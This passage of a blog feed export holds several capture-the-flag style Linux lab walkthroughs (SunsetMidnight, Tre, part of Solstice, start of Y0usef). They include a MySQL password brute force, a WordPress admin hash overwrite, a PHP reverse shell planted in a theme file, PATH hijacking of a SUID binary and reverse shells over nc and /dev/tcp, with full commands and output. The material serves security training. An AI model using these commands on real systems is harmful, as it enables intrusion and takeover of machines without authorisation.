<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@solstice:/var/tmp/webserver$ echo &quot;&lt;?php system(&#x27;chmod +s /usr/bin/find&#x27;); ?&gt;&quot; &gt; /var/tmp/sv/index.php</span><br><span class="line">echo &quot;&lt;?php system(&#x27;chmod +s /usr/bin/find&#x27;); ?&gt;&quot; &gt; /var/tmp/sv/index.php</span><br><span class="line"></span><br><span class="line">www-data@solstice:/var/tmp/webserver$ curl localhost:57</span><br><span class="line">curl localhost:57</span><br><span class="line"></span><br><span class="line">www-data@solstice:/var/tmp/webserver$ ls -l /usr/bin/find</span><br><span class="line">ls -l /usr/bin/find</span><br><span class="line">-rwsr-sr-x 1 root root 315904 Feb 16  2019 /usr/bin/find</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Then use <code>find</code> to escalate our shell.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@solstice:/var/tmp/webserver$ find . -exec /bin/bash -p \; -quit</span><br><span class="line">find . -exec /bin/bash -p \; -quit</span><br><span class="line">bash-5.0# id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux Walkthrough</category>
      </categories>
      <tags>
        <tag>LFI</tag>
        <tag>Web Server</tag>
      </tags>
  </entry>
  <entry>
    <title>SunsetMidnight</title>
    <url>/undefined/SunsetMidnight/</url>
    <content><![CDATA[<h1 id="Exploitation-Guide-for-Sunset-Midnight"><a href="#Exploitation-Guide-for-Sunset-Midnight" class="headerlink" title="Exploitation Guide for Sunset: Midnight"></a><strong>Exploitation Guide for Sunset: Midnight</strong></h1><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a><strong>Enumeration</strong></h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h3><p>We start off by running an <code>nmap</code> scan:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~# sudo nmap 192.168.120.198</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-26 03:03 EDT</span><br><span class="line">Nmap scan report for 192.168.120.198</span><br><span class="line">Host is up (0.29s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a><strong>Web Enumeration</strong></h3><p>Trying to access the web server running on port 80 we receive the following response.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~# curl -v http://192.168.120.198</span><br><span class="line">*   Trying 192.168.120.198:80...</span><br><span class="line">* TCP_NODELAY set</span><br><span class="line">* Connected to 192.168.120.198 (192.168.120.198) port 80 (#0)</span><br><span class="line">&gt; GET / HTTP/1.1</span><br><span class="line">&gt; Host: 192.168.120.198</span><br><span class="line">&gt; User-Agent: curl/7.68.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt;</span><br><span class="line">* Mark bundle as not supporting multiuse</span><br><span class="line">&lt; HTTP/1.1 301 Moved Permanently</span><br><span class="line">&lt; Date: Wed, 26 Aug 2020 07:05:58 GMT</span><br><span class="line">&lt; Server: Apache/2.4.38 (Debian)</span><br><span class="line">&lt; X-Redirect-By: WordPress</span><br><span class="line">&lt; Location: http://sunset-midnight/</span><br><span class="line">&lt; Content-Length: 0</span><br><span class="line">&lt; Content-Type: text/html; charset=UTF-8</span><br><span class="line">&lt;</span><br><span class="line">* Connection #0 to host 192.168.120.198 left intact</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>It appears we are redirected to <code>http://sunset-midnight/</code> and will need to add the following entry to <code>/etc/hosts</code> to be able to access the site.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~# echo &quot;192.168.120.198 sunset-midnight&quot; | sudo tee -a /etc/hosts</span><br><span class="line">192.168.120.198 sunset-midnight</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Now when we browse to <code>http://sunset-midnight/</code> we are greeted with a WordPress site. Our next step is to run <code>wpscan</code> to see if we can identify any vulnerabiltiies.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~# wpscan --url http://sunset-midnight/ --enumerate p</span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#x27;_ \</span><br><span class="line">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.8.1</span><br><span class="line">       Sponsored by Automattic - https://automattic.com/</span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">[+] URL: http://sunset-midnight/ [192.168.120.98]</span><br><span class="line">[+] Started: Wed Aug 26 03:26:05 2020</span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entry: Server: Apache/2.4.38 (Debian)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] http://sunset-midnight/robots.txt</span><br><span class="line"> | Interesting Entries:</span><br><span class="line"> |  - /wp-admin/</span><br><span class="line"> |  - /wp-admin/admin-ajax.php</span><br><span class="line"> | Found By: Robots Txt (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">[+] Enumerating Most Popular Plugins (via Passive Methods)</span><br><span class="line">[+] Checking Plugin Versions (via Passive and Aggressive Methods)</span><br><span class="line"></span><br><span class="line">[i] Plugin(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] simply-poll-master</span><br><span class="line"> | Location: http://sunset-midnight/wp-content/plugins/simply-poll-master/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class="line"> | Confirmed By: Urls In 404 Page (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.5 (100% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - http://sunset-midnight/wp-content/plugins/simply-poll-master/readme.txt</span><br><span class="line"> | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)</span><br><span class="line"> |  - http://sunset-midnight/wp-content/plugins/simply-poll-master/readme.txt</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Unfortunately there doesn’t appear to be any vulnerabilities in the WordPress installation so we’ll move onto other services.</p>
<h3 id="MySQL-Enumeration"><a href="#MySQL-Enumeration" class="headerlink" title="MySQL Enumeration"></a><strong>MySQL Enumeration</strong></h3><p>Next we attempt to bruteforce the credentials for the MySQL database using <code>hydra</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~# hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.120.198 mysql -t 16</span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-27 00:23:32</span><br><span class="line">[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task</span><br><span class="line">[DATA] attacking mysql://192.168.120.198:3306/</span><br><span class="line">[3306][mysql] host: 192.168.120.198   login: root   password: robert</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-27 00:24:06</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We see that after about a minute we have identified the following credentials.</p>
<ul>
<li>Username: root</li>
<li>Password: robert</li>
</ul>
<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a><strong>Exploitation</strong></h2><h3 id="WordPress-Access"><a href="#WordPress-Access" class="headerlink" title="WordPress Access"></a><strong>WordPress Access</strong></h3><p>Armed with our MySQL credentials we can connect to MySQL and enumerate the WordPress database.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~# mysql -u root -h 192.168.120.198 -probert</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection id is 3199</span><br><span class="line">Server version: 10.3.22-MariaDB-0+deb10u1 Debian 10</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| wordpress_db       |</span><br><span class="line">+--------------------+</span><br><span class="line">4 rows in set (0.327 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; use wordpress_db;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">MariaDB [wordpress_db]&gt; select user_login, user_pass from wp_users;</span><br><span class="line">+------------+------------------------------------+</span><br><span class="line">| user_login | user_pass                          |</span><br><span class="line">+------------+------------------------------------+</span><br><span class="line">| admin      | $P$BaWk4oeAmrdn453hR6O6BvDqoF9yy6/ |</span><br><span class="line">+------------+------------------------------------+</span><br><span class="line">1 row in set (0.290 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [wordpress_db]&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Rather than try and crack the <code>admin</code> password we can simply replace it with our own.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MariaDB [wordpress_db]&gt; update wp_users set user_pass=md5(&#x27;admin&#x27;) where user_login=&#x27;admin&#x27;;</span><br><span class="line">Query OK, 1 row affected (0.298 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Remote-Code-Execution"><a href="#Remote-Code-Execution" class="headerlink" title="Remote Code Execution"></a><strong>Remote Code Execution</strong></h3><p>We can now browse to the <a href="http://sunset-midnight/wp-admin/">WordPress Admin Panel</a> and login with the credentials <code>admin:admin</code>. From we will browse to <code>Appearance</code> -&gt; <code>Theme Editor</code> and select the <code>Twenty Twenty</code> theme. We’ll replace the <code>404.php</code> file with the PHP reverse shell from <code>/usr/share/webshells/php/php-reverse-shell.php</code> and update the <code>$ip</code> and <code>$port</code> variables to connect back to us.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">set_time_limit (0);</span><br><span class="line">$VERSION = &quot;1.0&quot;;</span><br><span class="line">$ip = &#x27;kali&#x27;;</span><br><span class="line">$port = 8000;</span><br><span class="line">$chunk_size = 1400;</span><br><span class="line">$write_a = null;</span><br><span class="line">$error_a = null;</span><br><span class="line">$shell = &#x27;uname -a; w; id; /bin/sh -i&#x27;;</span><br><span class="line">$daemon = 0;</span><br><span class="line">$debug = 0;</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Next we start a Netcat handler to catch our reverse shell.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~# nc -lvp 8000listening on [any] 8000 ...</span><br></pre></td></tr></table></figure>

<p>We then browse to our shell located at <a href="http://sunset-midnight/wp-content/themes/twentytwenty/404.php">http://sunset-midnight/wp-content/themes/twentytwenty/404.php</a> and catch our reverse shell.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~# nc -lvp 8000listening on [any] 8000 ...connect to [kali] from sunset-midnight [192.168.120.198] 42828Linux midnight 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux 01:01:23 up 22:05,  1 user,  load average: 0.00, 0.00, 0.00USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHATroot     tty1     -                Wed03   21:59m  0.02s  0.01s -bashuid=33(www-data) gid=33(www-data) groups=33(www-data)/bin/sh: 0: can&#x27;t access tty; job control turned of</span><br></pre></td></tr></table></figure>

<h2 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a><strong>Escalation</strong></h2><h3 id="Insecure-File-Permissions"><a href="#Insecure-File-Permissions" class="headerlink" title="Insecure File Permissions"></a><strong>Insecure File Permissions</strong></h3><p>Searching for SUID binaries we find one which stands out, <code>/usr/bin/status</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ find / -perm -u=s 2&gt;/dev/null/usr/bin/su/usr/bin/sudo/usr/bin/fusermount/usr/bin/status/usr/bin/chfn/usr/bin/passwd/usr/bin/chsh/usr/bin/umount/usr/bin/newgrp/usr/bin/mount/usr/bin/gpasswd/usr/lib/eject/dmcrypt-get-device/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/openssh/ssh-keysign</span><br></pre></td></tr></table></figure>

<p><code>/usr/bin/status</code> isn’t a standard system binary and running it we get the service output for the <code>ssh</code> service.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ status* ssh.service - OpenBSD Secure Shell server   Loaded: loaded (/lib/systemd/system/ssh.service; enabled; vendor preset: enabled)   Active: active (running) since Wed 2020-08-26 02:55:47 EDT; 22h ago     Docs: man:sshd(8)           man:sshd_config(5)  Process: 427 ExecStartPre=/usr/sbin/sshd -t (code=exited, status=0/SUCCESS) Main PID: 629 (sshd)    Tasks: 1 (limit: 1148)   Memory: 4.7M   CGroup: /system.slice/ssh.service           `-629 /usr/sbin/sshd -D...</span><br></pre></td></tr></table></figure>

<p>Running <code>strings</code> over the binary it appears that <code>/usr/bin/status</code> prints the information by running <code>service ssh status</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ strings /usr/bin/status</span><br><span class="line">/lib64/ld-linux-x86-64.so.2</span><br><span class="line">libc.so.6</span><br><span class="line">setuid</span><br><span class="line">printf</span><br><span class="line">system</span><br><span class="line">__cxa_finalize</span><br><span class="line">setgid</span><br><span class="line">__libc_start_main</span><br><span class="line">GLIBC_2.2.5</span><br><span class="line">_ITM_deregisterTMCloneTable</span><br><span class="line">__gmon_start__</span><br><span class="line">_ITM_registerTMCloneTable</span><br><span class="line">u/UH</span><br><span class="line">[]A\A]A^A_</span><br><span class="line">Status of the SSH server:</span><br><span class="line">service ssh status</span><br><span class="line">;*3$&quot;</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>However</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ export PATH=/tmp:$PATH</span><br><span class="line">$ echo &quot;/bin/sh -p&quot; &gt; /tmp/service</span><br><span class="line">$ chmod +x /tmp/service</span><br><span class="line">$ /usr/bin/status</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),33(www-data)</span><br></pre></td></tr></table></figure>

<p>Focus：</p>
<p>提权部分</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=/tmp/:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmpecho “nc <span class="variable">$IP</span> 3333 -e /bin/sh” &gt; service</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod +x service</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/bin/status</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvnp 3333</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux Walkthrough</category>
      </categories>
      <tags>
        <tag>Reverse Shell</tag>
        <tag>Brute-Force</tag>
        <tag>Status</tag>
      </tags>
  </entry>
  <entry>
    <title>Tre</title>
    <url>/undefined/Tre/</url>
    <content><![CDATA[<h1 id="Exploitation-Guide-for-Tre"><a href="#Exploitation-Guide-for-Tre" class="headerlink" title="Exploitation Guide for Tre"></a><strong>Exploitation Guide for Tre</strong></h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><strong>Summary</strong></h2><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a><strong>Enumeration</strong></h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h3><p>We start off by running an <code>nmap</code> scan:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap 192.168.120.163</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-21 12:18 EDT</span><br><span class="line">Nmap scan report for 192.168.120.163</span><br><span class="line">Host is up (0.044s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">8082/tcp open  blackice-alerts</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Dirb"><a href="#Dirb" class="headerlink" title="Dirb"></a><strong>Dirb</strong></h3><p>Brute-forcing web directories on port 80 with the wordlist <strong>/usr/share/wordlists/dirb/big.txt</strong> and looking for PHP files reveals file <strong>/adminer.php</strong>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ dirb http://192.168.120.163/ /usr/share/wordlists/dirb/big.txt -X .php</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22</span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line">...</span><br><span class="line">+ http://192.168.120.163/adminer.php (CODE:200|SIZE:4654)</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Navigating to <a href="http://192.168.120.163/adminer.php">http://192.168.120.163/adminer.php</a>, we see that the software is <code>Adminer 4.7.7</code>, and it prompts us to enter the following fields to authenticate:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">System</span><br><span class="line">Server [localhost]</span><br><span class="line">Username</span><br><span class="line">Password</span><br><span class="line">Database</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We do not have this information yet to successfully log in.</p>
<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a><strong>Exploitation</strong></h2><h3 id="More-Dirb"><a href="#More-Dirb" class="headerlink" title="More Dirb"></a><strong>More Dirb</strong></h3><p>Using <code>dirb</code> tool once again, we are able to discover web directory <em>/mantisbt/config/</em>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ dirb http://192.168.120.163/mantisbt/ /usr/share/wordlists/dirb/big.txt -r</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22</span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line">...</span><br><span class="line">==&gt; DIRECTORY: http://192.168.120.163/mantisbt/config/</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Directory-Listing"><a href="#Directory-Listing" class="headerlink" title="Directory Listing"></a><strong>Directory Listing</strong></h3><p>Navigating to <a href="http://192.168.120.163/mantisbt/config/">http://192.168.120.163/mantisbt/config/</a> shows us a directory listing, which contains the file <strong>a.txt</strong>. Navigating to <a href="http://192.168.120.163/mantisbt/config/a.txt">http://192.168.120.163/mantisbt/config/a.txt</a>, we see the following snippet:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"># --- Database Configuration ---</span><br><span class="line">$g_hostname      = &#x27;localhost&#x27;;</span><br><span class="line">$g_db_username   = &#x27;mantissuser&#x27;;</span><br><span class="line">$g_db_password   = &#x27;password@123AS&#x27;;</span><br><span class="line">$g_database_name = &#x27;mantis&#x27;;</span><br><span class="line">$g_db_type       = &#x27;mysqli&#x27;;</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>This is exactly the information we need to authenticate at <a href="http://192.168.120.163/adminer.php">http://192.168.120.163/adminer.php</a>.</p>
<h3 id="Adminer-Database-Password-Disclosure"><a href="#Adminer-Database-Password-Disclosure" class="headerlink" title="Adminer Database Password Disclosure"></a><strong>Adminer Database Password Disclosure</strong></h3><p>Using the above setup information, we are able to authenticate at <a href="http://192.168.120.163/adminer.php">http://192.168.120.163/adminer.php</a> as follows:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">System: MySQL</span><br><span class="line">Server: localhost</span><br><span class="line">Username: mantissuser</span><br><span class="line">Password: password@123AS</span><br><span class="line">Database: mantis</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>The “users” table is always a prime candidate for database enumeration. In this case, it is <code>mantis_user_table</code>. Navigating to <code>SQL command</code> link (<a href="http://192.168.120.163/adminer.php?username=mantissuser&amp;db=mantis&amp;sql=">http://192.168.120.163/adminer.php?username=mantissuser&amp;db=mantis&amp;sql=</a>), we are able to list the contents of the table:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM mantis_user_table;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id	username	realname	email	        password	                    ...</span><br><span class="line">1	administrator	XiBejMub	root@localhost	3492f8fe2cb409e387ddb0521c999c38    ...</span><br><span class="line">2	tre	        Tr3@123456A!	tre@localhost	64c4685f8da5c2225de7890c1bad0d7f    ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a><strong>SSH</strong></h3><p>Having discovered a potential password <code>Tr3@123456A!</code> for user <code>tre</code>, we can try authenticating to the machine with these credentials:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ ssh tre@192.168.120.163tre@192.168.120.163&#x27;s password:Linux tre 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Tue May 12 23:56:00 2020 from 192.168.17.172tre@tre:~$</span><br></pre></td></tr></table></figure>

<h2 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a><strong>Escalation</strong></h2><h3 id="Local-Enumeration"><a href="#Local-Enumeration" class="headerlink" title="Local Enumeration"></a><strong>Local Enumeration</strong></h3><p>Checking which programs we are able to run with sudo, we find <code>/sbin/shutdown</code>. In addition, we can run it without providing a password:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tre@tre:~$ sudo -lMatching Defaults entries for tre on tre:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/binUser tre may run the following commands on tre:    (ALL) NOPASSWD: /sbin/shutdowntre@tre:~$</span><br></pre></td></tr></table></figure>

<h3 id="LinEnum"><a href="#LinEnum" class="headerlink" title="LinEnum"></a><strong>LinEnum</strong></h3><p>We download and execute the LinEnum script (<a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a>) to check for privilege escalation tactics:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo python3 -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...192.168.120.163 - - [20/Aug/2020 16:03:42] &quot;GET /linenum.sh HTTP/1.1&quot; 200 -</span><br></pre></td></tr></table></figure>

<p>Running LinEnum shows this under “running processes”:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tre@tre:~$ wget http://192.168.118.3/linenum.sh--2020-08-20 16:03:42--  http://192.168.118.3/linenum.shConnecting to 192.168.118.3:80... connected.HTTP request sent, awaiting response... 200 OKLength: 46631 (46K) [text/x-sh]Saving to: ‘linenum.sh’linenum.sh                  100%[===========================================&gt;]  45.54K  --.-KB/s    in 0.07s2020-08-20 16:03:42 (630 KB/s) - ‘linenum.sh’ saved [46631/46631]tre@tre:~$ chmod 777 linenum.shtre@tre:~$ ./linenum.sh########################################################## Local Linux Enumeration &amp; Privilege Escalation Script #...root       408  0.0  0.1   6728  3296 ?        Ss   15:58   0:00 /bin/bash /usr/bin/check-system...</span><br></pre></td></tr></table></figure>

<p>If we double-check the permissions of the script <code>/usr/bin/check-system</code>, it shows the following:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tre@tre:~$ ls -la /usr/bin/check-system-rw----rw- 1 root root 135 May 12 04:08 /usr/bin/check-system</span><br></pre></td></tr></table></figure>

<p>The file’s permissions show that it can be read by and written to as a user. However, it is run as <code>root</code> when the system starts. Currently, the file has the following contents:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DATE=`date &#x27;+%Y-%m-%d %H:%M:%S&#x27;`echo &quot;Service started at $&#123;DATE&#125;&quot; | systemd-cat -p infowhile :doecho &quot;Checking...&quot;;sleep 1;done</span><br></pre></td></tr></table></figure>

<p>Because it is run as <code>root</code> and we are able to reboot the machine, we can add SUID permissions to an arbitrary binary, such as <code>/usr/bin/find</code>. We can add the following instruction to the file:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +s /usr/bin/find</span><br></pre></td></tr></table></figure>

<p>This will result in this:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DATE=`date &#x27;+%Y-%m-%d %H:%M:%S&#x27;`echo &quot;Service started at $&#123;DATE&#125;&quot; | systemd-cat -p infochmod +s /usr/bin/findwhile :doecho &quot;Checking...&quot;;sleep 1;done</span><br></pre></td></tr></table></figure>

<p>After this modification, we can reboot the machine with sudo privileges:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tre@tre:~$ sudo shutdown -r nowtre@tre:~$ Connection to 192.168.120.163 closed by remote host.Connection to 192.168.120.163 closed.kali@kali:~$</span><br></pre></td></tr></table></figure>

<p>When we reconnect to the target machine next, if we check file permissions on <code>find</code>, we see that it has SUID permissions:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tre@tre:~$ find / -perm -u=s -type f 2&gt;/dev/null.../usr/bin/find...</span><br></pre></td></tr></table></figure>

<p>We can now abuse this binary to grant ourselves privileges of the <code>root</code> user as follows:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tre@tre:~$ whoamitretre@tre:~$ find . -exec /bin/sh -p \; -quit# whoamiroot#</span><br></pre></td></tr></table></figure>

<p>Focus：</p>
<p>在check-system中插入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.49.73/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo shutdown -r now</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>

<p>等待机器关机指令完成后NC反弹ROOT权限连接</p>
]]></content>
      <categories>
        <category>Linux Walkthrough</category>
      </categories>
      <tags>
        <tag>Mysql</tag>
        <tag>Gobuster</tag>
        <tag>Script</tag>
      </tags>
  </entry>
  <entry>
    <title>Y0usef</title>
    <url>/undefined/Y0usef/</url>
    <content><![CDATA[<h1 id="Y0usef"><a href="#Y0usef" class="headerlink" title="Y0usef"></a>Y0usef</h1><h1 id="Exploitation-Guide-for-Y0usef"><a href="#Exploitation-Guide-for-Y0usef" class="headerlink" title="Exploitation Guide for Y0usef"></a><strong>Exploitation Guide for Y0usef</strong></h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><strong>Summary</strong></h2><p>In this walkthrough, we will exploit the target via bypassing misconfigured application access safeguards. We’ll then exploit a file upload vulnerability while bypassing a basic file content type filtering by the application. We’ll be able to escalate our privileges on the target by either recovering a user’s credentials, who has unlimited sudo rights, or exploiting the operating system’s very old kernel version via the <em>overlayfs</em> local privilege escalation exploit.</p>
<h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a><strong>Enumeration</strong></h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h3><p>We’ll begin with an <code>nmap</code> scan.</p>
